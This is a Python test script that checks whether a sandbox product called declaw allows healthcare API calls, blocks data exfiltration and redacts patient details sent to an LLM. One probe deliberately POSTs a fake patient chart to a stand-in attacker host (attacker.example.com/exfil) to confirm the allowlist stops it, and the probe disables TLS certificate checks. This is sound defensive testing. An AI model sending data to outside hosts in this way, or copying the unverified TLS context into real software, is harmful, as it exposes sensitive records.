"""Targeted proof that declaw neutralizes multi-API attack paths.

Inside ONE sandbox using `healthcare_multi_api_policy()`:

  1. Live 200 from rxnav.nlm.nih.gov   (RxCUI lookup)
  2. Live 200 from api.fda.gov         (openFDA drug event)
  3. Live 200 from clinicaltrials.gov  (v2 trial search)
  4. Attempt https://attacker.example.com/exfil with PHI body → MUST be
     blocked by declaw's network allowlist (not in allow_out)
  5. LLM call with patient name + email + SSN → MUST see redaction tokens
     (rehydrate=False probe proves the PHI never reached OpenAI intact)

If all 5 behave as expected, declaw is doing what the workflow docs claim.
"""
from __future__ import annotations

import os
import sys
import textwrap

from declaw import (
    ALL_TRAFFIC,
    AuditConfig,
    NetworkPolicy,
    PIIConfig,
    Sandbox,
    SecurityPolicy,
)

GREEN = "\033[32m"; RED = "\033[31m"; END = "\033[0m"

passes = 0
fails = 0
def ok(m):
    global passes; passes += 1; print(f"  {GREEN}PASS{END} {m}")
def bad(m):
    global fails; fails += 1; print(f"  {RED}FAIL{END} {m}")


PROBE = textwrap.dedent("""
    import json, ssl, urllib.parse, urllib.request
    ctx = ssl._create_unverified_context()
    def fetch(url):
        req = urllib.request.Request(url, headers={"Accept":"application/json"})
        with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
            return r.status, json.loads(r.read().decode())

    out = {}

    # 1. RxNav
    try:
        s, d = fetch('https://rxnav.nlm.nih.gov/REST/approximateTerm.json?term=warfarin&maxEntries=1')
        c = (d.get('approximateGroup') or {}).get('candidate') or []
        out['rxnav'] = {'status': s, 'rxcui': c[0].get('rxcui') if c else None}
    except Exception as e: out['rxnav'] = {'error': f'{type(e).__name__}'}

    # 2. openFDA
    try:
        s, d = fetch('https://api.fda.gov/drug/event.json?limit=1')
        out['openfda'] = {'status': s, 'results': len(d.get('results') or [])}
    except Exception as e: out['openfda'] = {'error': f'{type(e).__name__}'}

    # 3. ClinicalTrials.gov v2
    try:
        s, d = fetch('https://clinicaltrials.gov/api/v2/studies?query.cond=lung+cancer&pageSize=1')
        out['ctgov'] = {'status': s, 'studies': len(d.get('studies') or [])}
    except Exception as e: out['ctgov'] = {'error': f'{type(e).__name__}'}

    # 4. Attempt exfil to an unlisted destination — expect BLOCKED
    import urllib.error
    try:
        body = json.dumps({'stolen_chart': 'patient=Jordan Rivera mrn=MRN-44218 ssn=123-45-6789'}).encode()
        req = urllib.request.Request('https://attacker.example.com/exfil', data=body,
                                     headers={'Content-Type':'application/json'})
        urllib.request.urlopen(req, timeout=10, context=ctx).read()
        out['exfil'] = 'REACHED_ATTACKER'
    except Exception as e:
        out['exfil'] = f'BLOCKED: {type(e).__name__}'

    # 5. LLM call with PHI — expect tokens echoed back (rehydrate=False)
    try:
        from openai import OpenAI
        PHI = 'Patient Jordan Rivera, email jordan@example.com, SSN 123-45-6789.'
        r = OpenAI().chat.completions.create(
            model='gpt-4.1',
            messages=[{'role':'user','content':
                f'Echo bot. Repeat verbatim between markers. <<<{PHI}>>>'}],
            max_completion_tokens=150,
        )
        out['llm_echo'] = r.choices[0].message.content
    except Exception as e:
        out['llm_echo'] = f'ERROR: {type(e).__name__}: {e}'

    with open('/tmp/out.json','w') as f: json.dump(out, f)
""")


def main() -> None:
    if not os.getenv("DECLAW_API_KEY"):
        print("DECLAW_API_KEY required"); sys.exit(1)
    if not os.getenv("OPENAI_API_KEY"):
        print("OPENAI_API_KEY required"); sys.exit(1)

    allow = [
        "api.openai.com", "rxnav.nlm.nih.gov",
        "api.fda.gov", "clinicaltrials.gov",
    ]
    # rehydrate=False deliberately — we need to SEE the tokens
    pol = SecurityPolicy(
        pii=PIIConfig(enabled=True,
                      types=["ssn", "email", "phone", "person_name", "address"],
                      action="redact", rehydrate_response=False),
        network=NetworkPolicy(allow_out=allow, deny_out=[ALL_TRAFFIC]),
        audit=AuditConfig(enabled=True),
    )
    sbx = Sandbox.create(template="ai-agent", timeout=300, security=pol,
                         envs={"OPENAI_API_KEY": os.environ["OPENAI_API_KEY"]})
    print(f"sandbox: {sbx.sandbox_id}  allow_out={allow}")
    try:
        sbx.files.write("/tmp/in.json", "{}")
        sbx.files.write("/tmp/probe.py", PROBE)
        r = sbx.commands.run("python3 /tmp/probe.py", timeout=180)
        if r.exit_code != 0:
            print("probe script failed:"); print(r.stderr[:1000]); sys.exit(1)
        import json
        out = json.loads(sbx.files.read("/tmp/out.json"))

        print("\n=== Results ===")
        print(json.dumps(out, indent=2)[:2000])
        print()

        # 1
        (ok if isinstance(out.get("rxnav"), dict) and out["rxnav"].get("status") == 200 else bad)(
            "RxNav lookup returned HTTP 200"
        )
        # 2
        (ok if isinstance(out.get("openfda"), dict) and out["openfda"].get("status") == 200 else bad)(
            "openFDA drug event returned HTTP 200"
        )
        # 3
        (ok if isinstance(out.get("ctgov"), dict) and out["ctgov"].get("status") == 200 else bad)(
            "ClinicalTrials.gov v2 returned HTTP 200"
        )
        # 4
        (ok if str(out.get("exfil", "")).startswith("BLOCKED") else bad)(
            f"attacker.example.com blocked by allowlist: {out.get('exfil')!r}"
        )
        # 5
        echo = out.get("llm_echo", "")
        leaked = ("jordan@example.com" in echo) or ("123-45-6789" in echo) or ("Jordan Rivera" in echo)
        (bad if leaked else ok)("LLM echo did NOT contain raw PHI (redaction fired)")

        print(f"\n{GREEN}{passes} pass{END}   {RED}{fails} fail{END}")
        sys.exit(0 if fails == 0 else 1)
    finally:
        sbx.kill()


if __name__ == "__main__":
    main()
